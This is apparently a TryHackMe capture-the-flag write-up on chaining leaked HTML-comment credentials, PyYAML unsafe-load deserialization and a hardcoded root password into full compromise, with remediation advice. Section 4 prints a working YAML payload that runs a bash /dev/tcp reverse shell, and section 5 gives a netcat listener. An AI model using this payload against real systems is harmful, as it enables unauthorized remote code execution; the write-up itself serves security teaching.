# TryHackMe — YAML Deserialization to Root

## Overview

This write-up documents the exploitation path used to compromise the target machine, starting with network enumeration and exposed web-application credentials, followed by **YAML deserialization leading to Remote Code Execution (RCE)** and finally **Linux privilege escalation through hardcoded root credentials**.


## 1. Reconnaissance

I started by performing an Nmap scan to identify open ports, services, and their versions.

```bash
nmap -sT -sV -Pn --min-rate 5000 <TARGET_IP>
```

## 2. Discovering Web Application Credentials

Opening the web application revealed the site's homepage.

While inspecting the page source, I found an interesting HTML comment containing a staff note:

```text
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
```

The comment exposed valid credentials:

```text
Username: dj
Password: dj
```

I used these credentials to authenticate to the web application.

> **Security issue:** Credentials should never be stored in publicly accessible HTML comments or source code. Even though HTML comments are not displayed directly on the page, they are still delivered to the client.

---

## 3. Finding the YAML Import Functionality

After logging in, I explored the application's available functionality.

I discovered an **Import / Export** feature.

Selecting **Export** caused the application to provide a YAML file.

The exported file itself did not contain explicit instructions for exploitation, but the presence of a YAML **import** functionality was an important clue.

This raised an important question:

> How does the application parse the uploaded YAML file?

If the backend uses an unsafe Python YAML deserialization function such as:

```python
yaml.load(file)
```

rather than a safe loader, specially crafted YAML can potentially cause Python objects to be instantiated during deserialization.

---

## 4. Exploiting Unsafe YAML Deserialization

For the lab, I created a malicious YAML file containing a Python object construction directive:

```yaml
!!python/object/apply:os.system
args:
  - "bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"
```

> Replace `10.10.10.10` with the IP address of the attacking machine used for the lab.

### What does this payload do?

The important part is:

```yaml
!!python/object/apply:os.system
```

PyYAML's unsafe loader can interpret this tag as an instruction to invoke a Python callable.

In this case, the callable is:

```python
os.system
```

The supplied argument executes:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

This attempts to create an interactive Bash shell and redirect its input and output to a TCP connection controlled by the attacker.

Conceptually, the vulnerable application is performing something equivalent to:

```python
os.system("<attacker-controlled command>")
```

during YAML deserialization.

### Why does it work?

The vulnerability occurs because **unsafe YAML deserialization can turn attacker-controlled YAML data into executable Python objects**.

A safe application should treat uploaded YAML as data rather than allowing arbitrary Python object construction.

For example, applications using PyYAML should generally prefer a safe loader for untrusted YAML:

```python
yaml.safe_load(file)
```

instead of:

```python
yaml.load(file)
```

The exact behavior also depends on the PyYAML version and loader configuration, but the core issue is allowing untrusted input to reach an unsafe deserialization mechanism.

## 5. Setting Up the Reverse Shell Listener

Before uploading the malicious YAML file, I started a Netcat listener on the attacker machine:

```bash
nc -lvnp 4444
```

The listener waits for the target machine to connect back.

I then returned to the application's **Import** functionality and uploaded the crafted YAML file.

Because the vulnerable application processed the YAML using an unsafe deserialization mechanism, the embedded command was executed on the target.

---

## 6. Obtaining the Shell

The target connected back to my Netcat listener, providing a shell on the target machine.

I verified that command execution was occurring on the target and then began enumerating the system.

At this point, the initial objective was to obtain the user flag.

---

## 7. Retrieving `user.txt`

After obtaining the shell, I explored the user's accessible files and located the user flag.

```bash
cat user.txt
```

The contents of `user.txt` provided the **user flag**.

## 8. Post-Exploitation Enumeration

With the user-level shell established, I began inspecting the filesystem and looking for possible privilege-escalation paths.

During the enumeration, I discovered a Python script named:

```text
jukeboxd.py
```

I inspected the contents of the script.

```bash
cat jukeboxd.py
```

The script contained credentials that were used by the application/service.

Among the information present in the script was a **hardcoded root password**.

This was a significant privilege-escalation finding.

### Security issue

Hardcoding privileged credentials inside application source code is extremely dangerous.

If an attacker obtains access to the application files, they may be able to recover credentials that provide direct access to privileged accounts.

Credentials should instead be stored securely using appropriate secret-management mechanisms, environment-specific configuration, or other protected credential stores.

---

## 9. Privilege Escalation to Root

After discovering the root credentials, I switched to the root account:

```bash
su root
```

I supplied the password discovered in `jukeboxd.py`.

The authentication succeeded, giving me a root shell.

I verified my privileges with:

```bash
whoami
```

which returned:

```text
root
```

---

## 10. Retrieving `root.txt`

With root privileges, I accessed the root flag:

```bash
cat /root/root.txt
```

This revealed the **root flag**, completing the machine.

# Vulnerabilities Identified

## 1. Exposed Credentials

Credentials were present inside an HTML comment:

```text
dj / dj
```

### Impact

An unauthenticated user could discover credentials simply by viewing the application's source.

### Remediation

* Never place credentials in HTML, comments, JavaScript, or client-accessible files.
* Rotate credentials that have already been exposed.
* Use strong, unique passwords.

---

## 2. Unsafe YAML Deserialization

The application appeared to process attacker-controlled YAML using an unsafe deserialization mechanism.

The dangerous pattern is:

```python
yaml.load(file)
```

when used in a way that permits arbitrary Python object construction from untrusted input.

### Impact

An attacker who can upload YAML may potentially achieve:

* Arbitrary Python object construction
* Command execution
* Remote Code Execution
* Reverse shell access
* Full server compromise

### Remediation

Use a safe YAML loader for untrusted input:

```python
yaml.safe_load(file)
```

Additionally:

* Validate uploaded files.
* Restrict accepted YAML structures.
* Avoid accepting arbitrary Python objects.
* Run the application with the minimum required privileges.
* Implement proper application-layer authorization.

---

## 3. Hardcoded Root Credentials

The `jukeboxd.py` script contained privileged credentials.

### Impact

Anyone who gains sufficient filesystem access to the script can potentially recover the root password and completely compromise the machine.

### Remediation

* Never hardcode privileged passwords in source code.
* Store secrets outside source code.
* Use a secrets manager where appropriate.
* Rotate exposed credentials.
* Run services with dedicated low-privilege accounts.
* Apply least-privilege permissions to application files.

---

# Lessons Learned

This machine demonstrates how multiple relatively simple security mistakes can be chained together into complete system compromise.

The overall attack path was:

```text
Information Disclosure
        ↓
Weak Credentials
        ↓
Authenticated Web Access
        ↓
Unsafe YAML Deserialization
        ↓
Remote Code Execution
        ↓
User Shell
        ↓
Hardcoded Privileged Credentials
        ↓
Root Access
```

The most important takeaway is that **deserialization vulnerabilities can turn apparently harmless data-processing functionality into code execution when untrusted input is handled by an unsafe loader**.

From a defensive perspective, applications should treat all client-controlled files as untrusted input, use safe parsing mechanisms, avoid hardcoded credentials, and ensure that application services run with the minimum privileges required.

# Conclusion

The machine was compromised by combining several weaknesses:

1. Credentials were exposed in the application's HTML source.
2. Those credentials provided access to the authenticated dashboard.
3. The dashboard exposed YAML import functionality.
4. Unsafe YAML deserialization allowed attacker-controlled Python object execution.
5. This resulted in a reverse shell.
6. The user flag was obtained.
7. Further filesystem enumeration revealed `jukeboxd.py`.
8. The script contained hardcoded root credentials.
9. Using those credentials allowed escalation to `root`.
10. The root flag was then retrieved.

This was a good demonstration of how **web application vulnerabilities, insecure deserialization, poor credential management, and weak privilege separation can be chained together to achieve full system compromise**.
